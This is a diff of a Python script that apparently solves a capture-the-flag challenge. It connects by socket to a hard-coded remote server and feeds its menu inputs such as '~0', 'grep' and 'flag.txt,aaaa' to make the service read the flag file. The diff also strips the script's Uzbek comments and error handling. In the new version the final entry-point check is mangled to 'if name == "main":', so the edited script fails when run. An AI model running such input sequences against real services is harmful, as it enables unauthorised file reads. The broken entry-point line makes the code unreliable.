@@ -2,7 +2,6 @@
 import socket
 import time
 
-# IP va Portni yangilab oling
 HOST = "154.57.164.68"
 PORT = 31363
 
@@ -10,62 +9,57 @@ def recv_until(sock, marker, timeout=10):
     sock.settimeout(timeout)
     data = b""
     while marker not in data:
-        try:
-            chunk = sock.recv(4096)
-            if not chunk:
-                break
-            data += chunk
-        except socket.timeout:
+        chunk = sock.recv(4096)
+        if not chunk:
             break
+        data += chunk
     return data
 
 def sendline(sock, s):
     if isinstance(s, str):
         s = s.encode()
     sock.sendall(s + b"\n")
-    time.sleep(0.3) # Server qabul qilishiga ulgurishi uchun
+    time.sleep(0.2)
 
 def main():
-    try:
-        with socket.create_connection((HOST, PORT), timeout=10) as sock:
-            # 1. Mode tanlash
-            recv_until(sock, b"> ")
-            sendline(sock, "1")
-            recv_until(sock, b"(mode)> ")
-            sendline(sock, "~0") # Natija: -1
+    with socket.create_connection((HOST, PORT), timeout=10) as sock:
+        print(recv_until(sock, b"> ").decode(errors="ignore"))
 
-            # 2. Bin tanlash (ls ishlatish tavsiya etiladi)
-            recv_until(sock, b"> ")
-            sendline(sock, "2")
-            recv_until(sock, b"(bin)> ")
-            sendline(sock, "ls")
+        sendline(sock, "1")
+        print(recv_until(sock, b"(mode)> ").decode(errors="ignore"))
+        sendline(sock, "~0")
 
-            # 3. Argumentlar (rc=1 va rc=2 olish uchun)
-            recv_until(sock, b"> ")
-            sendline(sock, "3")
-            recv_until(sock, b"(arg1,arg2)> ")
-            # Birinchi argument: ruxsat yo'q yoki xato (rc=1)
-            # Ikkinchi argument: mavjud bo'lmagan yo'l (rc=2)
-            sendline(sock, "/root,/nonexistent")
+        print(recv_until(sock, b"> ").decode(errors="ignore"))
+        sendline(sock, "2")
+        print(recv_until(sock, b"(bin)> ").decode(errors="ignore"))
+        sendline(sock, "grep")
 
-            # 4. Switchlar (minus taqiqlangan bo'lsa nuqta ishlating)
-            recv_until(sock, b"> ")
-            sendline(sock, "4")
-            recv_until(sock, b"(switch1,switch2)> ")
-            sendline(sock, ".,.")
+        print(recv_until(sock, b"> ").decode(errors="ignore"))
+        sendline(sock, "3")
+        print(recv_until(sock, b"(arg1,arg2)> ").decode(errors="ignore"))
+        sendline(sock, "flag.txt,aaaa")
 
-            # 5. Beat the competitor!
-            recv_until(sock, b"> ")
-            sendline(sock, "5")
+        print(recv_until(sock, b"> ").decode(errors="ignore"))
+        sendline(sock, "4")
+        print(recv_until(sock, b"(switch1,switch2)> ").decode(errors="ignore"))
+        sendline(sock, "ZZZ,ZZZ")
 
-            # Flagni o'qish
-            print("[+] Flag kutilmoqda...")
-            time.sleep(1)
-            out = sock.recv(4096).decode(errors="ignore")
-            print(out)
+        print(recv_until(sock, b"> ").decode(errors="ignore"))
+        sendline(sock, "5")
 
-    except Exception as e:
-        print(f"[!] Xatolik: {e}")
+        time.sleep(1)
+        out = b""
+        sock.settimeout(3)
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                out += chunk
+        except Exception:
+            pass
 
-if __name__ == "__main__":
+        print(out.decode(errors="ignore"))
+
+if name == "main":
     main()
